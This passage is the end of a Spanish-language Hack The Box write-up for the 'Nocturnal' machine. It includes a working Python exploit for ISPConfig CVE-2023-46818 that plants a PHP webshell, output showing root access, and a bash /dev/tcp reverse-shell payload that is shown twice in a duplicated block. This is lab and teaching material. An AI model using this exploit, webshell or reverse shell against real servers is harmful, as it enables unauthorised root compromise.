‚ï∞‚îÄ‚ùØ ssh <span class="nt">-L</span> 9001:127.0.0.1:8080 tobias@10.10.11.64
</pre></table></code></div></div><p>Accedimos a <code class="language-plaintext highlighter-rouge">http://localhost:9001</code> y nos encontramos con la pantalla de login de ISPConfig.</p><p>Usando <code class="language-plaintext highlighter-rouge">admin:slowmotionapocalypse</code> (reutilizaci√≥n de contrase√±a) iniciamos sesi√≥n y vimos que la versi√≥n instalada es <code class="language-plaintext highlighter-rouge">ISPConfig Version: 3.2.10p1</code>, vulnerable a CVE-2023-46818.</p><h3 id="explotaci√≥n-cve-2023-46818-rce-root"><span class="me-2">Explotaci√≥n CVE-2023-46818 (RCE Root)</span><a href="#explotaci√≥n-cve-2023-46818-rce-root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>La vulnerabilidad permite inyectar PHP en <code class="language-plaintext highlighter-rouge">language_edit.php</code> a trav√©s del par√°metro <code class="language-plaintext highlighter-rouge">records[]</code>. Si se logra una cuenta de superadministrador, es posible escribir c√≥digo PHP que se ejecuta con privilegios del proceso web.</p><p>Script usado (exploit que planta una webshell):</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="n">requests</span><span class="p">,</span> <span class="n">re</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">base64</span><span class="p">,</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span>
<span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">()</span>

<span class="n">URL</span><span class="p">,</span> <span class="n">USER</span><span class="p">,</span> <span class="n">PW</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span>            <span class="c1"># uso: python3 exploit.py http://x/ admin pass
</span><span class="k">if</span> <span class="ow">not</span> <span class="n">URL</span><span class="p">.</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">):</span> <span class="n">URL</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">/</span><span class="sh">'</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">();</span> <span class="n">s</span><span class="p">.</span><span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span>

<span class="c1"># 1) login
</span><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">'</span><span class="s">login/</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">:</span><span class="n">USER</span><span class="p">,</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span><span class="n">PW</span><span class="p">,</span><span class="sh">'</span><span class="s">s_mod</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">login</span><span class="sh">'</span><span class="p">})</span>
<span class="k">if</span> <span class="sh">'</span><span class="s">Username or Password wrong</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span> <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="sh">'</span><span class="s">[-] Login fail</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] Logged in</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># 2) busca tokens CSRF en language_edit
</span><span class="n">lang_params</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">lang</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">en</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">module</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">help</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">lang_file</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">xyz.lng</span><span class="sh">'</span><span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">'</span><span class="s">admin/language_edit.php</span><span class="sh">'</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">lang_params</span><span class="p">)</span>
<span class="n">csrf_id</span>  <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">name=</span><span class="sh">"</span><span class="s">_csrf_id</span><span class="sh">"</span><span class="s">\s+value=</span><span class="sh">"</span><span class="s">([^</span><span class="sh">"</span><span class="s">]+)</span><span class="sh">"'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">csrf_key</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">name=</span><span class="sh">"</span><span class="s">_csrf_key</span><span class="sh">"</span><span class="s">\s+value=</span><span class="sh">"</span><span class="s">([^</span><span class="sh">"</span><span class="s">]+)</span><span class="sh">"'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>

<span class="c1"># 3) payload: escribe sh.php
</span><span class="n">php</span> <span class="o">=</span> <span class="sh">"</span><span class="s">&lt;?php echo </span><span class="sh">'</span><span class="s">OK</span><span class="sh">'</span><span class="s">; if(isset($_GET[</span><span class="sh">'</span><span class="s">c</span><span class="sh">'</span><span class="s">])) system($_GET[</span><span class="sh">'</span><span class="s">c</span><span class="sh">'</span><span class="s">]); ?&gt;</span><span class="sh">"</span>
<span class="n">inj</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"'</span><span class="s">];file_put_contents(</span><span class="sh">'</span><span class="s">sh.php</span><span class="sh">'</span><span class="s">,base64_decode(</span><span class="sh">'</span><span class="si">{</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">php</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">()</span><span class="si">}</span><span class="sh">'</span><span class="s">));die;#</span><span class="sh">"</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">lang</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">en</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">module</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">help</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">lang_file</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">xyz.lng</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">_csrf_id</span><span class="sh">'</span><span class="p">:</span><span class="n">csrf_id</span><span class="p">,</span><span class="sh">'</span><span class="s">_csrf_key</span><span class="sh">'</span><span class="p">:</span><span class="n">csrf_key</span><span class="p">,</span><span class="sh">'</span><span class="s">records[</span><span class="se">\\</span><span class="s">]</span><span class="sh">'</span><span class="p">:</span><span class="n">inj</span><span class="p">}</span>
<span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">'</span><span class="s">admin/language_edit.php</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] Webshell planted as /admin/sh.php</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># 4) prueba
</span><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">'</span><span class="s">admin/sh.php</span><span class="sh">'</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">c</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">})</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] Command output:</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</pre></table></code></div></div><p>Y su uso:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>‚ï≠‚îÄkali@kali ~/Nocturnal/exploits via üêç v3.13.6  at üïê 21:15
‚ï∞‚îÄ‚ùØ python3 exploit.py http://localhost:9001/ admin <span class="s1">'slowmotionapocalypse'</span>
<span class="o">[</span>+] Logged <span class="k">in</span>
<span class="o">[</span>+] Webshell planted as /admin/sh.php
<span class="o">[</span>+] Command output:
 <span class="nv">OKuid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</pre></table></code></div></div><blockquote><p>[!NOTE]</p><h2 id="qu√©-es-y-por-qu√©-ocurre"><span class="me-2">¬øQu√© es y por qu√© ocurre?</span><a href="#qu√©-es-y-por-qu√©-ocurre" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><strong>CVE-2023-46818</strong> afecta a <strong>ISPConfig ‚â§ 3.2.11</strong> cuando est√° activada la opci√≥n <code class="language-plaintext highlighter-rouge">admin_allow_langedit</code>. El editor de idiomas (<code class="language-plaintext highlighter-rouge">/admin/language_edit.php</code>) procesa el par√°metro <code class="language-plaintext highlighter-rouge">records[]</code> sin sanitizaci√≥n suficiente, permitiendo <strong>inyecci√≥n de PHP</strong> y ejecuci√≥n de c√≥digo con los privilegios del proceso de la interfaz web (en algunas instalaciones, ese contexto puede llegar a ser root). El fallo qued√≥ <strong>parchado en 3.2.11p1</strong>. <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46818?utm_source=chatgpt.com">NVD</a><a href="https://www.ispconfig.org/blog/ispconfig-3-2-11p1-released/?utm_source=chatgpt.com">ISPConfig</a></p><p>Importante: el propio proyecto indica que la explotaci√≥n requiere estar autenticado como el <strong>usuario ‚Äúadmin‚Äù (superadmin incorporado)</strong>; cuentas de cliente/reseller/email y ‚Äúotros admins‚Äù creados adicionalmente <strong>no</strong> estar√≠an afectadas por este vector.</p></blockquote><p>Ahora podremos verificar si tenemos una webshell, dentro de la ruta <code class="language-plaintext highlighter-rouge">/admin/sh.php</code> y usando el parametro <code class="language-plaintext highlighter-rouge">id</code></p><p><a href="/assets/img/nocturnal-easy/Pasted%20image%2020250824182138.png" class="popup img-link shimmer"><img src="/assets/img/nocturnal-easy/Pasted%20image%2020250824182138.png" alt="id-root" loading="lazy"></a></p><p>confirmamos que la webshell se hizo y tenemos root, quiz√°s pudi√©ramos verificar la rota root y sacar le flag, pero que sentido tiene si no lo hacemos en la terminal no? vamos a eso</p><p>ahora hagamos lo mismo pero para una Reverse shell</p><p>Reverse shell:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://localhost:9001/admin/sh.php?c<span class="o">=</span>bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.177/4444%200%3E%261%27
</pre></table></code></div></div><p>Finalmente, como <code class="language-plaintext highlighter-rouge">root</code> buscamos la flag:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>root@nocturnal:/usr/local/ispconfig/interface/web# <span class="nb">cd</span> /root
root@nocturnal:~# <span class="nb">ls
</span>root.txt
scripts
</pre></table></code></div></div><p>Flag conseguida. ‚úÖ</p><p>ahora podremos verificar si tenemos una webshell, dentro de la ruta <code class="language-plaintext highlighter-rouge">/admin/sh.php</code> y usando el parametro <code class="language-plaintext highlighter-rouge">id</code></p><p><a href="/assets/img/nocturnal-easy/Pasted%20image%2020250824182138.png" class="popup img-link shimmer"><img src="/assets/img/nocturnal-easy/Pasted%20image%2020250824182138.png" alt="id-root" loading="lazy"></a></p><p>confirmamos que la webshell se hizo y tenemos root, quiz√°s pudi√©ramos verificar la rota root y sacar le flag, pero que sentido tiene si no lo hacemos en la terminal no? vamos a eso</p><p>ahora hagamos lo mismo pero para una Reverse shell</p><p>Reverse shell:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://localhost:9001/admin/sh.php?c<span class="o">=</span>bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.177/4444%200%3E%261%27
</pre></table></code></div></div><p>Y ya como root:</p><p><a href="/assets/img/nocturnal-easy/Pasted%20image%2020250824182547.png" class="popup img-link shimmer"><img src="/assets/img/nocturnal-easy/Pasted%20image%2020250824182547.png" alt="root" loading="lazy"></a></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>root@nocturnal:/usr/local/ispconfig/interface/web# <span class="nb">cd</span> /root
<span class="nb">cd</span> /root
root@nocturnal:~# <span class="nb">ls
ls
</span>root.txt
scripts
</pre></table></code></div></div><p>Flag conseguida. ‚úÖ</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/writeups/">Writeups</a>, <a href="/categories/htb/">HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/nocturnal/" class="post-tag no-text-decoration" >nocturnal</a> <a href="/tags/idor/" class="post-tag no-text-decoration" >idor</a> <a href="/tags/rce/" class="post-tag no-text-decoration" >rce</a> <a href="/tags/ispconfig/" class="post-tag no-text-decoration" >ispconfig</a> <a href="/tags/cve-2023-46818/" class="post-tag no-text-decoration" >cve-2023-46818</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/hashcat/" class="post-tag no-text-decoration" >hashcat</a> <a href="/tags/ffuf/" class="post-tag no-text-decoration" >ffuf</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Nocturnal%20-%20Easy%20(HTB)%20-%20LogRob&url=https%3A%2F%2Frobertoluzanilla.github.io%2Fposts%2Fnocturnal-easy%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Nocturnal%20-%20Easy%20(HTB)%20-%20LogRob&u=https%3A%2F%2Frobertoluzanilla.github.io%2Fposts%2Fnocturnal-easy%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Frobertoluzanilla.github.io%2Fposts%2Fnocturnal-easy%2F&text=Nocturnal%20-%20Easy%20(HTB)%20-%20LogRob" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/nocturnal-easy/">Nocturnal - Easy (HTB)</a><li class="text-truncate lh-lg"> <a href="/posts/certificado-coursera/">Mi experiencia con el certificado Google Cybersecurity</a><li class="text-truncate lh-lg"> <a href="/posts/certificado-ejpt/">Mi experiencia con la certificaci√≥n eJPTv2</a><li class="text-truncate lh-lg"> <a href="/posts/Lame/">Lame - Easy (HTB)</a><li class="text-truncate lh-lg"> <a href="/posts/two-million-writeup/">Two Million - Easy (HTB)</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/htb/">HTB</a> <a class="post-tag btn btn-outline-primary" href="/tags/certificaciones/">certificaciones</a> <a class="post-tag btn btn-outline-primary" href="/tags/ciberseguridad/">ciberseguridad</a> <a class="post-tag btn btn-outline-primary" href="/tags/api/">API</a> <a class="post-tag btn btn-outline-primary" href="/tags/bienvenida/">bienvenida</a> <a class="post-tag btn btn-outline-primary" href="/tags/burpsuite/">BurpSuite</a> <a class="post-tag btn btn-outline-primary" href="/tags/coursera/">Coursera</a> <a class="post-tag btn btn-outline-primary" href="/tags/cve-2007-2447/">CVE-2007-2447</a> <a class="post-tag btn btn-outline-primary" href="/tags/cve-2023-0386/">CVE-2023-0386</a> <a class="post-tag btn btn-outline-primary" href="/tags/cve-2023-46818/">cve-2023-46818</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/two-million-writeup/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1752904800" data-df="ll" > Jul 19, 2025 </time><h4 class="pt-0 my-2">Two Million - Easy (HTB)</h4><div class="text-muted"><p>Writeup completo de la m√°quina Two Million (Easy) de Hack The Box, explotando APIs mal protegidas, inyecciones y escalada de privilegios con CVE-2023-0386.</p></div></div></a></article><article class="col"> <a href="/posts/Lame/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1752904800" data-df="ll" > Jul 19, 2025 </time><h4 class="pt-0 my-2">Lame - Easy (HTB)</h4><div class="text-muted"><p>Writeup completo de la m√°quina Lame (Easy) de Hack The Box. Explotaci√≥n de Samba con CVE-2007-2447 para obtener acceso root en una m√°quina Linux vulnerable.</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/certificado-ejpt/" class="btn btn-outline-primary" aria-label="Older" ><p>Mi experiencia con la certificaci√≥n eJPTv2</p></a><div class="btn btn-outline-primary disabled" aria-label="Newer"><p>-</p></div></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>¬© <time>2025</time> <a href="https://github.com/RobertoLuzanilla">Roberto Carlos Luzanilla Sanchez</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.4.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/htb/">HTB</a> <a class="post-tag btn btn-outline-primary" href="/tags/certificaciones/">certificaciones</a> <a class="post-tag btn btn-outline-primary" href="/tags/ciberseguridad/">ciberseguridad</a> <a class="post-tag btn btn-outline-primary" href="/tags/api/">API</a> <a class="post-tag btn btn-outline-primary" href="/tags/bienvenida/">bienvenida</a> <a class="post-tag btn btn-outline-primary" href="/tags/burpsuite/">BurpSuite</a> <a class="post-tag btn btn-outline-primary" href="/tags/coursera/">Coursera</a> <a class="post-tag btn btn-outline-primary" href="/tags/cve-2007-2447/">CVE-2007-2447</a> <a class="post-tag btn btn-outline-primary" href="/tags/cve-2023-0386/">CVE-2023-0386</a> <a class="post-tag btn btn-outline-primary" href="/tags/cve-2023-46818/">cve-2023-46818</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> (function () { const themeMapper = Theme.getThemeMapper('light', 'dark_dimmed'); const initTheme = themeMapper[Theme.visualState]; let lang = 'es';if (lang.length > 2 && !lang.startsWith('zh')) { lang = lang.slice(0, 2); } let giscusAttributes = { src: 'https://giscus.app/client.js', 'data-repo': 'RobertoLuzanilla/robertoluzanilla.github.io', 'data-repo-id': 'R_kgDOPNVDwA', 'data-category': 'Announcements', 'data-category-id': 'DIC_kwDOPNVDwM4CtL5b', 'data-mapping': 'pathname', 'data-strict' : '0', 'data-reactions-enabled': '1', 'data-emit-metadata': '0', 'data-theme': initTheme, 'data-input-position': 'top', 'data-lang': lang, 'data-loading': 'lazy', crossorigin: 'anonymous', async: '' }; let giscusNode = document.createElement('script'); Object.entries(giscusAttributes).forEach(([key, value]) => giscusNode.setAttribute(key, value) ); const $footer = document.querySelector('footer'); $footer.insertAdjacentElement("beforebegin", giscusNode); addEventListener('message', (event) => { if (event.source === window && event.data && event.data.id === Theme.ID) { const newTheme = themeMapper[Theme.visualState]; const message = { setConfig: { theme: newTheme } }; const giscus = document.getElementsByClassName('giscus-frame')[0].contentWindow; giscus.postMessage({ giscus: message }, 'https://giscus.app'); } }); })(); </script> <script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{content}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
